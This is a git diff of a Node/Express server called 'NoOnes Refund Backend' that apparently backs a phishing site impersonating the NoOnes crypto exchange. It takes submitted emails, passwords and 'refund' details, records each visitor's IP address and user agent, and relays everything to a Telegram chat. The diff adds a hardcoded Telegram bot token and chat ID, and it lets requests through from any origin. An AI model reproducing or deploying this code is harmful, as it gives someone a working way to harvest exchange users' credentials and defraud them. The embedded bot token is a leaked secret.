@@ -1,7 +1,7 @@
 // ============================================
 // NoOnes Refund Backend Server
 // Telegram Integration | Railway Deployment
-// Port: 5000 (Set in Railway Variables)
+// Port: 5000
 // ============================================
 
 const express = require('express');
@@ -15,18 +15,19 @@ const app = express();
 const PORT = process.env.PORT || 5000;
 
 // ============================================
-// CONFIGURATION (from Railway Environment Variables)
+// CONFIGURATION
 // ============================================
-const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
-const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
+const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8959682316:AAEFW23lt-waRnNMAIhIy4_evhz6LpwMaxA';
+const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '7386607055';
 const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
 
 // Allowed origins for CORS
 const allowedOrigins = [
     'https://noonesrefund.vercel.app',
+    'https://noonesrefund-production.up.railway.app',
     'http://localhost:3000',
     'http://localhost:5000',
-    'https://noonesrefund-production.up.railway.app'
+    'http://localhost:5500'
 ];
 
 // ============================================
@@ -45,8 +46,9 @@ app.use(cors({
         if (allowedOrigins.indexOf(origin) !== -1) {
             callback(null, true);
         } else {
-            console.log('Blocked origin:', origin);
-            callback(null, true); // Allow all origins for testing (remove in production)
+            console.log('⚠️ Blocked origin:', origin);
+            // Allow anyway for testing (remove in production)
+            callback(null, true);
         }
     },
     methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
@@ -63,7 +65,7 @@ app.use(express.urlencoded({ extended: true }));
 
 // Rate Limiting
 const limiter = rateLimit({
-    windowMs: 15 * 60 * 1000, // 15 minutes
+    windowMs: 15 * 60 * 1000,
     max: 100,
     message: 'Too many requests from this IP, please try again later.',
     standardHeaders: true,
@@ -74,7 +76,7 @@ app.use('/api/', limiter);
 // Logging Middleware
 app.use((req, res, next) => {
     console.log(`[${new Date().toISOString()}] ${req.method} ${req.path}`);
-    console.log('Origin:', req.headers.origin);
+    console.log('Origin:', req.headers.origin || 'N/A');
     if (req.body && Object.keys(req.body).length > 0) {
         const safeBody = { ...req.body };
         if (safeBody.password) safeBody.password = '********';
@@ -160,25 +162,6 @@ function formatRefundMessage(data) {
   `;
 }
 
-function formatRefundActionMessage(data) {
-    const { action, amount, currency, status, timestamp, ip } = data;
-    
-    return `
-⚡ <b>Refund Action</b>
-═══════════════════════
-
-📌 <b>Action:</b> ${action || 'N/A'}
-💵 <b>Amount:</b> <code>${amount || '0'} ${currency || 'USDT'}</code>
-🔄 <b>Status:</b> ${status || 'Processing'}
-
-🕐 <b>Time:</b> ${timestamp || new Date().toISOString()}
-🌐 <b>IP Address:</b> ${ip || 'N/A'}
-
-═══════════════════════
-🔄 NoOnes Refund Update
-  `;
-}
-
 // ============================================
 // API ROUTES
 // ============================================
@@ -209,7 +192,7 @@ app.get('/api/health', (req, res) => {
     });
 });
 
-// ===== LOGIN ENDPOINT =====
+// ===== LOGIN ENDPOINT - THIS IS WHAT YOU NEED! =====
 app.post('/api/login', async (req, res) => {
     try {
         const { email, password } = req.body;
@@ -262,7 +245,6 @@ app.post('/api/refund', async (req, res) => {
     try {
         const refundData = req.body;
         
-        // Validate required fields
         if (!refundData.sender || !refundData.recipient || !refundData.amount) {
             return res.status(400).json({
                 success: false,
@@ -270,12 +252,10 @@ app.post('/api/refund', async (req, res) => {
             });
         }
 
-        // Get client info
         const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'N/A';
         const userAgent = req.headers['user-agent'] || 'N/A';
         const timestamp = new Date().toISOString();
 
-        // Format and send to Telegram
         const message = formatRefundMessage({
             ...refundData,
             timestamp,
@@ -284,8 +264,6 @@ app.post('/api/refund', async (req, res) => {
         });
 
         await sendToTelegram(message);
-
-        console.log(`📨 Refund data received: ${refundData.amount} ${refundData.currency || 'USDT'}`);
 
         res.json({
             success: true,
@@ -343,6 +321,25 @@ app.post('/api/refund/action', async (req, res) => {
     }
 });
 
+function formatRefundActionMessage(data) {
+    const { action, amount, currency, status, timestamp, ip } = data;
+    
+    return `
+⚡ <b>Refund Action</b>
+═══════════════════════
+
+📌 <b>Action:</b> ${action || 'N/A'}
+💵 <b>Amount:</b> <code>${amount || '0'} ${currency || 'USDT'}</code>
+🔄 <b>Status:</b> ${status || 'Processing'}
+
+🕐 <b>Time:</b> ${timestamp || new Date().toISOString()}
+🌐 <b>IP Address:</b> ${ip || 'N/A'}
+
+═══════════════════════
+🔄 NoOnes Refund Update
+  `;
+}
+
 // ============================================
 // ERROR HANDLING
 // ============================================
@@ -350,8 +347,7 @@ app.use((err, req, res, next) => {
     console.error('❌ Global error:', err);
     res.status(500).json({
         success: false,
-        message: 'Something went wrong!',
-        error: process.env.NODE_ENV === 'development' ? err.message : undefined
+        message: 'Something went wrong!'
     });
 });
 
@@ -378,17 +374,4 @@ app.listen(PORT, '0.0.0.0', () => {
     console.log(`📡 Telegram Bot: ${TELEGRAM_BOT_TOKEN ? '✅ Configured' : '❌ Missing'}`);
     console.log(`📡 Chat ID: ${TELEGRAM_CHAT_ID ? '✅ Configured' : '❌ Missing'}`);
     console.log(`\n🌐 Server URL: https://noonesrefund-production.up.railway.app`);
-});
-
-// ============================================
-// GRACEFUL SHUTDOWN
-// ============================================
-process.on('SIGTERM', () => {
-    console.log('🛑 Received SIGTERM signal, closing server...');
-    process.exit(0);
-});
-
-process.on('SIGINT', () => {
-    console.log('🛑 Received SIGINT signal, closing server...');
-    process.exit(0);
 });
